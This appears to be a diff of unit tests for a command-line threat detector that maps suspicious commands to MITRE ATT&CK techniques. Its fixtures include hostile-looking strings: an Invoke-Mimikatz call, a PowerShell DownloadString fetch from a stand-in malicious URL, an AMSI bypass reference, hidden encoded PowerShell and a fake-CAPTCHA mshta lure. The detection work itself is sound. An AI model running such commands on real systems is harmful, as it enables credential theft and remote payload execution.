@@ -3,15 +3,12 @@ from CommandLineAnalysis import (
     is_base64,
     identify_and_decode_base64,
     reverse_command,
-    check_malicious_commands,
-    check_reconnaissance_temp,
-    check_windows_temp_paths,
-    check_suspicious_content,
-    check_amsi,
     check_mixed_case_powershell,
-    check_powershell_suspicious_patterns,
-    check_macOS_suspicious_commands,
     analyze_command_line,
+    find_suspicious_patterns,
+    check_macOS_suspicious_commands,
+    check_social_engineering,
+    PATTERNS,
 )
 
 # Test data
@@ -58,40 +55,56 @@ def test_reverse_command():
 
 # Test check_malicious_commands
 def test_check_malicious_commands():
-    command = "Invoke-Expression mimikatz"
-    matches = check_malicious_commands(command)
-    assert "mimikatz" in matches
+    command = "Invoke-Mimikatz"
+    matches = find_suspicious_patterns(command, PATTERNS["credentials_dumping"])
+    assert "Invoke-Mimikatz" in matches[0]["match"]
+    assert "T1003" in matches[0]["mitreid"]
+    assert "OS Credential Dumping" in matches[0]["technique"]
 
 
 # Test check_reconnaissance_temp
 def test_check_reconnaissance_temp():
     command = "ipconfig /all netstat -ano"
-    matches = check_reconnaissance_temp(command)
-    assert "ipconfig" in matches
-    assert "netstat" in matches
+    matches = find_suspicious_patterns(command, PATTERNS["recon_commands"])
+    assert "ipconfig" in matches[0]["match"]
+    assert "T1016" in matches[0]["mitreid"]
+    assert "System Network Configuration Discovery" in matches[0]["technique"]
+    assert "netstat" in matches[1]["match"]
+    assert "T1049" in matches[1]["mitreid"]
+    assert "System Network Connections Discovery" in matches[1]["technique"]
 
 
 # Test check_windows_temp_paths
 def test_check_windows_temp_paths():
     command = "C:\\Temp\\test.txt %TEMP%\\malware.exe"
-    matches = check_windows_temp_paths(command)
-    assert "C:\\Temp" in matches
-    assert "%TEMP%" in matches
+    matches = find_suspicious_patterns(command, PATTERNS["windows_temp_paths"])
+    assert "C:\\Temp" in matches[1]["match"]
+    assert "T1074" in matches[1]["mitreid"]
+    assert "Data Staged" in matches[1]["technique"]
+    assert "%TEMP%" in matches[0]["match"]
+    assert "T1074" in matches[0]["mitreid"]
+    assert "Data Staged" in matches[0]["technique"]
 
 
 # Test check_suspicious_content
 def test_check_suspicious_content():
     command = "powershell -enc Y2FsYy5leGU= -WindowStyle Hidden"
-    matches = check_suspicious_content(command)
-    assert "-enc" in matches
-    assert "-WindowStyle Hidden" in matches
+    matches = find_suspicious_patterns(command, PATTERNS["suspicious_parameters"])
+    assert "-enc" in matches[0]["match"]
+    assert "T1027" in matches[0]["mitreid"]
+    assert "Obfuscated Files or Information" in matches[0]["technique"]
+    assert "-WindowStyle Hidden" in matches[1]["match"]
+    assert "T1564.003" in matches[1]["mitreid"]
+    assert "Hidden Window" in matches[1]["technique"]
 
 
 # Test check_amsi
 def test_check_amsi():
     command = "System.Management.Automation.AmsiUtils"
-    matches = check_amsi(command)
-    assert "System.Management.Automation.AmsiUtils" in matches
+    matches = find_suspicious_patterns(command, PATTERNS["amsi_techniques"])
+    assert "System.Management.Automation.AmsiUtils" in matches[0]["match"]
+    assert "T1562.001" in matches[0]["mitreid"]
+    assert "Disable or Modify Tools" in matches[0]["technique"]
 
 
 # Test check_mixed_case_powershell
@@ -104,8 +117,10 @@ def test_check_mixed_case_powershell():
 # Test check_powershell_suspicious_patterns
 def test_check_powershell_suspicious_patterns():
     command = "powershell -Command (New-Object Net.WebClient).DownloadString('http://malicious')"
-    matches = check_powershell_suspicious_patterns(command)
-    assert "DownloadString" in matches
+    matches = find_suspicious_patterns(command, PATTERNS["powershell_suspicious_patterns"])
+    assert "DownloadString" in matches[0]["match"]
+    assert "T1105" in matches[0]["mitreid"]
+    assert "Ingress Tool Transfer" in matches[0]["technique"]
 
 
 # Test check_reconnaissance_temp
@@ -132,6 +147,12 @@ def test_custom_high_risk_combo():
     assert result["risk"] == "High Risk"
 
 
+def test_check_social_engineering():
+    command = 'mshta "http://www.demisto.com?checkmark=" # I\'m not a robot ✅'
+    matches = check_social_engineering(command)
+    assert "Emoji Found in command line" in matches
+
+
 # Test analyze_command_line
 def test_analyze_command_line():
     result = analyze_command_line(MALICIOUS_COMMAND_LINE)
@@ -142,3 +163,5 @@ def test_analyze_command_line():
     result = analyze_command_line(MACOS_COMMAND_LINE, custom_patterns=["secret_copy"])
     assert result["risk"] == "High Risk"
     assert "custom patterns detected (1 instances)" in result["findings"]["original"]
+    assert "macOS suspicious commands detected" in result["findings"]["original"]
+    assert result["score"] == 71
